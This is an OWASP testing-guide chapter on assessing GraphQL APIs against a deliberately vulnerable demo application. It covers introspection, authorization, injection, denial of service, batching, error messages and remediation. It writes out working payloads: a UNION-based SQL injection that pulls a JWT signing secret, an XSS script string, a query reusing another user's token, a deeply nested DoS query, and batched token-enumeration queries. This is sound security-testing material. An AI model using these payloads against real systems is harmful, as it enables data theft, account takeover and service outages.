# Testing GraphQL

|ID          |
|------------|
|WSTG-APIT-01|

## Summary

GraphQL has become very popular in modern APIs. It provides simplicity and nested objects, which facilitate faster development. While every technology has advantages, it can also expose the application to new attack surfaces. The purpose of this scenario is to provide some common misconfigurations and attack vectors on applications that utilize GraphQL. Some vectors are unique to GraphQL (e.g. [Introspection Query](#introspection-queries)) and some are generic to APIs (e.g. [SQL injection](#sql-injection)).

Examples in this section will be based on a vulnerable GraphQL application [poc-graphql](https://github.com/righettod/poc-graphql), which is run in a docker container that maps `localhost:8080/GraphQL` as the vulnerable GraphQL node.

## Test Objectives

- Assess that a secure and production-ready configuration is deployed.
- Validate all input fields against generic attacks.
- Ensure that proper access controls are applied.

## How to Test

Testing GraphQL nodes is not very different than testing other API technologies. Consider the following steps:

### Introspection Queries

Introspection queries are the method by which GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.

The [GraphQL website describes Introspection](https://graphql.org/learn/introspection/):

> "It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!"

There are a couple of ways to extract this information and visualize the output, as follows.

#### Using Native GraphQL Introspection

The most straightforward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

The result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.

Response:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

A tool such as [GraphQL Voyager](https://apis.guru/graphql-voyager/) can be used to get a better understanding of the GraphQL endpoint:

![GraphQL Voyager](images/Voyager.png)\
*Figure 12.1-1: GraphQL Voyager*

This tool creates an Entity Relationship Diagram (ERD) representation of the GraphQL schema, allowing you to get a better look into the moving parts of the system you're testing. Extracting information from the drawing allows you to see you can query the Dog table for example. It also shows which properties a Dog has:

- ID
- name
- veterinary (ID)

There is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL. For example, the mutations available are not listed in the drawing above. A better strategy would be to use both Voyager and one of the methods listed below.

#### Using GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes. The best practice is to not allow users to access it on production deployments. If you are testing a staging environment, you might have access to it and can thus save some time when working with introspection queries (although you can, of course, use introspection in the GraphiQL interface).

GraphiQL has a documentation section, which uses the data from the schema in order to create a document of the GraphQL instance that is being used. This document contains the data types, mutations, and basically every piece of information that can be extracted using introspection.

#### Using GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) is a GraphQL client. It can be used to test different queries, as well as divide GraphQL IDEs into different playgrounds, and group them by theme or by assigning a name to them. Much like GraphiQL, Playground can create documentation for you without the need for manually sending introspection queries and processing the response(s). It has another great advantage: It doesn't need the GraphiQL interface to be available. You can direct the tool to the GraphQL node via a URL, or use it locally with a data file. GraphQL Playground can be used to test for vulnerabilities directly, so you don't need to use a personal proxy to send HTTP requests. This means you can use this tool for simple interaction with and assessment of GraphQL. For other more advanced payloads, use a personal proxy.

Note that in some cases, you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication. This still allows creating multiple "IDEs" with different permissions to verify if there are in fact authorization issues.

![Playground1](images/Playground1.png)\
*Figure 12.1-2: GraphQL Playground High Level API Docs*

![Playground2](images/Playground2.png)\
*Figure 12.1-3: GraphQL Playground API Schema*

You can even download the schemas to use in Voyager.

#### Introspection Conclusion

Introspection is a useful tool that allows users to gain more information about the GraphQL deployment. However, this will also allow malicious users to gain access to the same information. The best practice is to limit access to the introspection queries, since some tools or requests might fail if this feature is disabled altogether. As GraphQL usually bridges to the back end APIs of the system, it's better to enforce strict access control.

### Authorization

Introspection is the first place to look for authorization problems. As noted, access to introspection should be restricted as it allows for data extraction and data gathering. Once a tester has access to the schema and knowledge of the sensitive information there is to extract, they should then send queries that will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform authorization enforcement.

In the earlier examples, the output of the introspection query shows there is a query called `auth`. This seems like a good place to extract sensitive information such as API tokens, passwords, etc.

![Auth GraphQL Query](images/auth1.png)\
*Figure 12.1-4: GraphQL Auth Query API*

Testing the authorization implementation varies from deployment to deployment since each schema will have different sensitive information, and hence, different targets to focus on.

In this vulnerable example, every user (even unauthenticated) can gain access to the auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the schema allows, such as associating or disassociating a dog from any specified veterinarian using mutations, even if there is no matching auth token for the veterinarian in the request.

Here is an example in which the tester uses an extracted token they do not own to perform an action as the veterinarian "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

And the response:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

All of the Dogs in the list belong to Benoit, and not to the auth token owner. It's possible to perform this type of action when proper authorization enforcement is not implemented.

### Injection

GraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a back end API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, etc. Using GraphQL just changes the entry point of the malicious payload.

You can refer to other scenarios within the OWASP testing guide to get some ideas.

GraphQL also has scalars, which are usually used for custom data types that do not have native data types, such as DateTime. These types of data do not have out-of-the-box validation, making them good candidates for testing.

#### SQL Injection

The example application is vulnerable by design in the query `dogs(namePrefix: String, limit: Int = 500): [Dog!]`  since the parameter `namePrefix` is concatenated in the SQL query. Concatenating user input is a common malpractice of applications that can expose them to SQL injection.

The following query extracts information from the `CONFIG` table within the database:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

The response to this query is:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

The query contains the secret that signs JWTs in the example application, which is very sensitive information.

In order to know what to look for in any particular application, it will be helpful to collect information about how the application is built and how the database tables are organized. You can also use tools like `sqlmap` to look for injection paths and even automate the extraction of data from the database.

#### Cross-Site Scripting (XSS)

Cross-site scripting occurs when an attacker injects executable code that is subsequently run by the browser. Learn about tests for XSS in the [Input Validation](../07-Input_Validation_Testing/README.md) chapter. You may test for reflected XSS using a payload from [Testing for Reflected Cross Site Scripting](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

In this example, errors might reflect the input and could cause XSS to occur.

Payload:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Response:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Denial of Service (DoS) Queries

GraphQL exposes a very simple interface to allow developers to use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function and causing a denial of service by using up CPU, memory, or other compute resources.

Looking back at _Figure 12.1-1_, you can see that it is possible to create a loop where a Dog object contains a Veterinary object. There could be an endless amount of nested objects.

This allows for a deep query which has the potential to overload the application:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

There are multiple security measures that can be implemented to prevent these types of queries, listed in the [Remediation](#remediation) section. Abusive queries can cause issues like DoS for GraphQL deployments and should be included in testing.

### Batching Attacks

GraphQL supports batching of multiple queries into a single request. This allows users to request multiple objects or multiple instances of objects efficiently. However, an attacker can utilize this functionality in order to perform a batching attack. Sending more than a single query in one request looks like the following:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

In the example application, a single request can be sent in order to extract all of the veterinary names using the guessable ID (it's an increasing integer). An attacker can then utilize the names in order to get access tokens. Instead of doing so in many requests, which might be blocked by a network security measure like a web application firewall or a rate limiter like Nginx, these requests may be batched. This means there would only be a couple of requests, which may allow for efficient brute forcing without being detected. Here is an example query:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

This will provide the attacker with the names of the veterinaries and, as shown before, the names can be used to batch multiple queries requesting the auth tokens of those veterinaries. For example:

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Batching attacks can be used to bypass many security measures enforced on websites. It can also be used to enumerate objects and attempt to brute force multi-factor authentication or other sensitive information.

### Detailed Error Message

GraphQL can encounter unexpected errors during runtime. When such an error occurs, the server may send an error response that may reveal internal error details or application configurations or data. This allows a malicious user to acquire more information about the application. As part of testing, error messages should be checked by sending unexpected data, a process known as fuzzing. The responses should be searched for potentially sensitive information that may be revealed using this technique.

### Exposure of Underlying API

GraphQL is a relatively new technology, and some applications are transitioning from old APIs to GraphQL. In many cases, GraphQL is deployed as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If requests to the underlying API are not properly checked for authorization, it could lead to a possible escalation of privileges.

For example, a request containing the parameter `id=1/delete` might be interpreted as `/api/users/1/delete`. This could extend to the manipulation of other resources belonging to `user=1`. It is also possible that the request is interpreted to have the authorization given to the GraphQL node, instead of the true requester.

A tester should try and gain access to underlying API methods as it may be possible to escalate privileges.

## Remediation

- Restrict access to introspection queries.
- Implement input validation.
    - GraphQL does not have a native way to validate input, however, there is an open source project called ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) which allows for input validation as part of the schema definition.
    - Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.
- Implement security measures to prevent abusive queries.
    - Timeouts: restrict the amount of time that a query is permitted to run.
    - Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.
    - Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.
    - Use server-time-based throttling: limit the amount of server time a user can consume.
    - Use query-complexity-based throttling: limit the total complexity of queries a user can consume.
- Send generic error messages: use generic error messages that do not reveal details of the deployment.
- Mitigate batching attacks:
    - Add object request rate limiting in code.
    - Prevent batching for sensitive objects.
    - Limit the number of queries that can run at one time.

For more on remediating GraphQL weaknesses, refer to the [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Tools

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp Extension)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (Burp Extension)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on for OWASP ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## References

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [GraphQL Official Site](https://graphql.org/learn/)
- [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [Client-side Testing](../11-Client-side_Testing/README.md) (XSS and other vulnerabilities)
- [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
